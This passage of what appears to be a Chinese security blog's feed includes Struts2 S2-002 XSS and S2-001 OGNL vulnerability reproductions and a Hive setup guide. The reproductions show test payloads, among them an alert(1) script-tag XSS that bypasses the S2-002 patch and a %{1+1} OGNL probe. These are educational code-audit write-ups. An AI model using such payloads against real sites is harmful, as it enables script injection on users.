class="keyword">class</span> <span class="title">Xss</span>  <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    public <span class="type">String</span> execute() <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="type">SUCCESS</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>struct.xml</code>中添加<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;action <span class="built_in">name</span>=<span class="string">"Xss"</span> <span class="built_in">class</span>=<span class="string">"com.demo.action.Xss"</span>&gt;</span><br><span class="line">        &lt;<span class="literal">result</span> <span class="built_in">name</span>=<span class="string">"success"</span>&gt;xss_test.jsp&lt;/<span class="literal">result</span>&gt;</span><br><span class="line">&lt;/action&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5e4019070d.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>首先看一下官方关于漏洞的描述<br><img src="https://i.loli.net/2019/04/16/5cb5e6016f1be.png" alt><br>可以看到漏洞主要原因是Struts 2框架在处理<code>&lt;s:url&gt;</code> 和<code>&lt;s:a&gt;</code>标签时，未对标签内的字符进行转义，导致XSS漏洞。<br>在我们搭建的Demo中，以<code>&lt;s:url&gt;</code>标签为例进行分析<br>这里需要说明的是struts2允许使用自定义的其自定义的标签，如上面的<code>&lt;s:url&gt;</code>即为struct2 url标签。在使用struts2标签时需在页面中添加<code>&lt;%@ taglib uri =&quot;/struts-tags&quot; prefix =&quot;s&quot; %&gt;</code>。引入标签配置。该配置在<code>struts2-core</code>核心jar包中,<code>META-INF/struts-tags.tld</code>对struts2标签进行了定义。<br>比如我们本次使用的<code>&lt;s:url&gt;</code><br><img src="https://i.loli.net/2019/04/17/5cb6999ce1263.png" alt><br><code>&lt;tag-class&gt;org.apache.struts2.views.jsp.URLTag&lt;/tag-class&gt;</code>说明了标签的具体实现类为<code>org.apache.struts2.views.jsp.URLTag</code><br><img src="https://i.loli.net/2019/04/17/5cb69a62d7947.png" alt><br>在本例中<code>&lt;s:url&gt;</code>标签在<code>xss_test.jps</code>中，jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，当struts2在解析到标签时，实际上是继承了http servlet中可扩展的BodyTagSupport类。<br>然后依次执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">doStartTag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">setBodyContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doInitBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doAfterBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doEndTag</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><p>我们从<code>doStartTag</code>方法下断开始跟踪。<br>使用payload访问<code>localhost:8080/test_war_exploded/Xss.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;=boogle</code><br><img src="https://i.loli.net/2019/04/17/5cb693baf10db.png" alt><br>在<code>doStartTag</code>方法中通过<code>gettBean()</code>方法获取URL组件,然后通过<code>populateParams()</code>方法对获取的URL组件中属性进行赋值。<br>然后执行<code>this.component.start(this.pageContext.getOut())</code>方法，即前面提到的<code>URL</code>组件的start方法。<br>跟进该方法<br><img src="https://i.loli.net/2019/04/17/5cb69cedead85.png" alt><br>首先会判断<code>&lt;s:url&gt;</code>标签中设置的<code>includeParams</code>参数，该属性有三个值：<code>none</code> <code>get</code> <code>all</code>，默认值为get。属性值为get时，该url会将访问其所在jsp的的请求的所有get方法的参数添加到自身来 ，属性值为all时更是将get和post的的参数值全部添加到自身来，属性值为none时不添加。<br>本例中我们设置的参数值为<code>all</code>，之后便进入到<code>includeParams</code>值为<code>all</code>的流程，执行<code>mergeRequestParameters</code>方法。<br>跟进<br><img src="https://i.loli.net/2019/04/17/5cb69f9785c27.png" alt><br>在该方法中取到我们的payload，并保存在<code>parameters</code>中。<br>然后回到URL组件的<code>start</code>方法中，继续执行进入到<code>includeGetParameters</code>方法。<br><img src="https://i.loli.net/2019/04/17/5cb6a10e054a2.png" alt><br>该方法中使用<code>extractQueryString</code>方法获得参数信息，该方法会直接调用<code>HttpServletRequest</code>的<code>getQueryString</code>的方法直接获取浏览器发送的请求信息。<br>之后又调用<code>UrlHelper.parseQueryString(query)</code>以<code>&amp;</code>为分隔符将获取的请求信息分隔出不同的参数。将参数保存在<code>queryParams</code><br><img src="https://i.loli.net/2019/04/17/5cb6a41aafcce.png" alt><br>在该过程中会对参数的value值使用<code>translateAndDecode</code>编码处理，而不会对参数name进行任何处理。<br>然后继续执行进入<code>mergeRequestParameters</code>将参数名称和值保存到<code>parameters</code>中。<br>至此<code>doStartTag</code>工作完成，然后进入到<code>doEndTag</code>方法<br><img src="https://i.loli.net/2019/04/17/5cb6a5dcce68a.png" alt><br>然后进入<code>end</code>方法，实现对标签的内容渲染工作。<br><img src="https://i.loli.net/2019/04/17/5cb6a836a26eb.png" alt></p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">if</span> the action was <span class="keyword">not</span> explicitly <span class="built_in">set</span> grab the params <span class="keyword">from</span> the request</span><br><span class="line">        <span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">            buildParametersString(params, link);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            buildParametersString(params, link, <span class="string">"&amp;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="literal">result</span> = link.toString();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">result</span>.indexOf(<span class="string">"&lt;script&gt;"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="literal">result</span> = <span class="literal">result</span>.replaceAll(<span class="string">"&lt;script&gt;"</span>, <span class="string">"script"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="literal">result</span> = encodeResult ? response.encodeURL(<span class="literal">result</span>) : <span class="literal">result</span>;</span><br><span class="line">        &#125; catch (<span class="type">Exception</span> ex) &#123;</span><br><span class="line">            // <span class="type">Could</span> <span class="keyword">not</span> encode the <span class="type">URL</span> <span class="keyword">for</span> some reason</span><br><span class="line">            // <span class="type">Use</span> it unchanged</span><br><span class="line">            <span class="literal">result</span> = link.toString();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>补丁使用<code>while</code>循环对<code>&lt;script&gt;</code>进行去除，仍可使用<code>&lt;script boogle&gt;</code>样式绕过。<br>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">boogle</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>=boogle</span><br></pre></td></tr></table></figure></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p><a href="https://www.angelwhu.com/blog/?p=312" target="_blank" rel="noopener">Struts2标签原理分析</a><br><a href="https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html" target="_blank" rel="noopener">https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第二篇文章，复现分析&lt;code&gt;S2-002&lt;/code&gt; xss漏洞。&lt;/p
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Centos7配置安装HIVE</title>
    <link href="https://zhengbao.wang/Centos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE/"/>
    <id>https://zhengbao.wang/Centos7配置安装HIVE/</id>
    <published>2019-04-17T02:00:30.000Z</published>
    <updated>2019-04-17T02:01:38.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自<a href="https://www.yiibai.com/hive/" target="_blank" rel="noopener">https://www.yiibai.com/hive/</a></p><p>本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a></p><h2 id="0x01-配置安装HIVE"><a href="#0x01-配置安装HIVE" class="headerlink" title="0x01 配置安装HIVE"></a>0x01 配置安装HIVE</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先<a href="http://www.apache.org/dyn/closer.cgi/hive/" target="_blank" rel="noopener">下载HIVE</a>,为了与Hadoop3.2.0,我选择的hive版本为3.1.1</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>下载完成后进行解压，根据解压目录自行配置环境变量<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="selector-class">.bashrc</span>   <span class="comment">//配置环境变量</span></span><br><span class="line">source <span class="selector-class">.bashrc</span>  <span class="comment">//使配置生效</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/17/5cb681dc428fd.png" alt></p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>移动到HIVE安装目录下的<code>conf</code>文件夹执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env<span class="selector-class">.sh</span><span class="selector-class">.template</span> hive-env<span class="selector-class">.sh</span> </span><br><span class="line"></span><br><span class="line">cp hive-default<span class="selector-class">.xml</span><span class="selector-class">.template</span> hive-site<span class="selector-class">.xml</span> </span><br><span class="line"></span><br><span class="line">cp hive-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-log4j2<span class="selector-class">.properties</span> </span><br><span class="line"></span><br><span class="line">cp hive-exec-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-exec-log4j2.properties</span><br></pre></td></tr></table></figure></p><p>修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下<br><img src="https://i.loli.net/2019/04/17/5cb682abe5216.png" alt></p><h3 id="Schema初始化"><a href="#Schema初始化" class="headerlink" title="Schema初始化"></a>Schema初始化</h3><p>执行<code>schematool -initSchema -dbType derby</code><br>执行成功效果如下<br><img src="https://i.loli.net/2019/04/17/5cb68361a0619.png" alt><br>如果执行failed，修改<code>hive-3.1.1/scripts/metastore/upgrade/derby</code>目录下的<code>hive-schema-2.1.0.derby.sql</code><br>按下图将框中内容使用注释符<code>--</code>注释<br><img src="https://i.loli.net/2019/04/17/5cb68443d23f9.png" alt><br>重新执行<code>schematool -initSchema -dbType derby</code></p><h3 id="启动HIVE"><a href="#启动HIVE" class="headerlink" title="启动HIVE"></a>启动HIVE</h3><p>Schema初始化成功后即可启动hive，命令<code>hive</code><br>启动成功如下，如出现报错，请移至文末<code>0x03 问题解决</code>查看笔者记录部分问题解决方法<br><img src="https://i.loli.net/2019/04/17/5cb68865ee29e.png" alt></p><h2 id="0x02-HIVE命令"><a href="#0x02-HIVE命令" class="headerlink" title="0x02 HIVE命令"></a>0x02 HIVE命令</h2><p><img src="https://i.loli.net/2019/04/17/5cb6889618cb6.png" alt><br>详细命令参考<a href="https://www.jianshu.com/p/b1fafc1bdb03" target="_blank" rel="noopener">Hive常用命令</a></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><h3 id="expansion-character问题"><a href="#expansion-character问题" class="headerlink" title="expansion character问题"></a>expansion character问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6858693bc8.png" alt><br>解决方法：修改报错的<code>hive-site.xml</code>,将报错位置<code>3210</code>行第96个字符删掉</p><h3 id="system-xxx-路径错误问题"><a href="#system-xxx-路径错误问题" class="headerlink" title="${system:xxx}路径错误问题"></a>${system:xxx}路径错误问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6869fbfe64.png" alt><br>出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。<br>如配置文件中用<code>${system:java.io.tmpdir}</code>定义的路径改为<code>/tmp/</code>,<code>${system:user.name}</code>定义的路径改为<code>${user.name}</code>，其他类似<br>可使用<code>cat -n hive-site.xml |grep system:</code>定位到出现问题的位置<br><img src="https://i.loli.net/2019/04/17/5cb687a138126.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
      <category term="hive" scheme="https://zhengbao.wang/tags/hive/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-001复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-001复现分析/</id>
    <published>2019-04-13T09:56:47.000Z</published>
    <updated>2019-04-17T08:32:59.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第一篇文章，还是决定以漏洞之王<code>struts2</code>下手，本篇即以学习为目的，复现分析<code>S2-001</code>,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方给出的漏洞影响版本为WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8。<br>本例中使用struts-2.0.1版本进行复现分析。</p><p>工具选择使用了<code>IDEA</code>，下面记录一下如何使用<code>IDEA</code>创建第一个struts2项目。<br>IDEA需下载<code>Ultimate</code>版本,<code>Community</code>版本无法创建<code>Java EE</code>工程。<br>首先<code>New Project</code>创建<code>Struts2</code>项目，<code>Libraries</code>选择<code>Set up library later</code><br><img src="https://i.loli.net/2019/04/13/5cb199d238fb8.png" alt><br>下一步之后填写项目名称即可创建起一个struts2 project<br><img src="https://i.loli.net/2019/04/13/5cb19a73c7b2b.png" alt><br>下载<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">struts-2.0.1-all</a></p><p>在项目目录<code>WEB-INF</code>下新建<code>lib</code>文件夹，将所需要的jar包从下载目录中导入到<code>lib</code>文件夹下</p><p>将全部jar包选中，右键<code>Add as Library</code><br><img src="https://i.loli.net/2019/04/13/5cb1a68f2cf2d.png" alt><br>填写一个Library Name<br><img src="https://i.loli.net/2019/04/13/5cb19dbb0a748.png" alt><br>然后<code>File-&gt;Project strutsure</code><br><img src="https://i.loli.net/2019/04/13/5cb19e06e4c46.png" alt><br>然后在<code>Modules</code>下选中<code>struts2-001</code><br><img src="https://i.loli.net/2019/04/13/5cb1a74e548e5.png" alt><br>之后再在<code>Artifacts</code>如下图将<code>struts2-001</code>put into output root，完成后点击OK.<br><img src="https://i.loli.net/2019/04/13/5cb19efb3dc76.png" alt><br>之后按下图创建<code>Tomcat server</code><br><img src="https://i.loli.net/2019/04/13/5cb1a09665c32.png" alt><br>在配置页面点击<code>Fix</code>,其他默认即可。<br><img src="https://i.loli.net/2019/04/13/5cb1a0d149c67.png" alt><br>至此即可看到一个struts2项目启动成功。<br><img src="https://i.loli.net/2019/04/13/5cb1a7b081bbd.png" alt><br>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。<br>在<code>WEB</code>目录下修改<code>index.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sign On<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后新建<code>welcome.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在<code>src</code>下新建<code>com.demo.action</code>package<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="title">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getUsername() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getPassword() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setUsername(String username) &#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setPassword(String password) &#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String execute() &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>struts.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"Login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.Login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后即可运行程序出现登陆Demo<br><img src="https://i.loli.net/2019/04/13/5cb1a96ed125a.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>在分析之前还是看一下十多年前官方的描述<br><img src="https://s2.ax1x.com/2019/04/12/AqalV0.png" alt="AqalV0.png"><br>看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<br>OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。<br>第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API <code>getValue</code>处下断点，该方法用于解析OGNL表达式并返回表达式的值。<br><img src="https://i.loli.net/2019/04/13/5cb147fc19bfc.png" alt><br>下断后便可发送payload<code>%{1+1}</code>，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。<br><img src="https://i.loli.net/2019/04/12/5cb00c397a2ee.png" alt><br>然后便可以根据调用栈开始分析过程。<br>首先我们的payload是从<code>index.jsp</code>输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://i.loli.net/2019/04/13/5cb157f27980b.png" alt><br>之后struts便会调用<code>ComponentTagSupport</code>类中<code>doStartTag</code> <code>doEndTag</code>方法对<code>index_JSP.hava</code>中的struts标签进行处理。<br><img src="https://i.loli.net/2019/04/13/5cb1583bbf7c7.png" alt><br>上图可以看出，调用<code>doEndTag</code>方法对标签时会调用<code>this.component.end()</code>方法。<br>跟进之后在<code>UIBean</code>类中<code>end</code>方法中会继续调用同类下的<code>evaluateParams</code><br><img src="https://i.loli.net/2019/04/13/5cb159a769188.png" alt><br>跟进<code>evaluateParams</code>，该方法会对标签属性取得name之后判断是否开启<code>altSyntax</code>功能，开启则会用<code>%{}</code>将标签属性值名称包裹，用于使用OGNL表达式对其处理。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">altSyntax</span> 功能是 <span class="keyword">Struts </span><span 